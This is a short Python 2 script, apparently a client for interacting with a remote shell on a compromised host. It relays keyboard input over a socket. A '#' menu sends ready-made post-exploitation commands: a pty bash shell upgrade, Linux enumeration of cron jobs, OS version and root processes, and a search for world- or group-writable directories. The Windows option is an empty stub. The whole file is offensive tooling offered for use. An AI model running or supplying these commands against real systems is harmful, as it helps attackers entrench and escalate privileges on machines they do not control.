#!/usr/bin/python

import socket, select, string, sys
 
def prompt() :
    sys.stdout.write('')
    sys.stdout.flush()

def get_cmd():
	p = True
	while p:
		print ("""
		[+] What Platform?
		1. Windows
		2. Linux
		""")
		p = raw_input("[!]>")
		if p == "1":
			print "Do stuff here"
			p = False
		elif p == "2":
			ans = True
			while ans:
				print ("""
		
				1. Spawn python shell
				2. Linux Basic
					uname -a | /etc/isue | ls -al /etc/cron.*
				3. Find writable directories
				""")
				ans = raw_input("[!]>")
				if ans == "1":
					msg = "python -c\'import pty;pty.spawn(\"/bin/bash\")\'\n"
					ans = False
					p = False
				elif ans == "2":
					msg = "uname -a; cat /etc/issue; ls -al /etc/cron.*; cat /etc/crontab; ps -aux | grep root\n"
					ans = False
					p = False
				elif ans == "3":
					msg = "find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;\n"
					ans = False
					p = False
				elif ans !="":
					print "[+] Please make a valid selection!"
					p = False

	return msg

 
if __name__ == "__main__":
     
    if(len(sys.argv) < 3) :
        print 'Usage : python 3connect.py hostname port'
        sys.exit()
     
    host = sys.argv[1]
    port = int(sys.argv[2])
     
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    # connect to remote host
    try :
        s.connect((host, port))
    except :
        print 'Unable to connect'
        sys.exit()
    print '[+] Connected to remote host.'
    prompt()
    while 1:
        socket_list = [sys.stdin, s]
        read_sockets, write_sockets, error_sockets = select.select(socket_list , [], [])
        for sock in read_sockets:
            if sock == s:
                data = sock.recv(4096)
                if not data :
                    print '\nDisconnected from target'
                    sys.exit()
                else :
                    sys.stdout.write(data)
                    prompt()
            else :
                msg = sys.stdin.readline()
		# Enumeration task
		if msg[0] == "#":
			msg = get_cmd()
			s.send(msg)
			prompt()
                else:
			s.send(msg)
               		prompt()
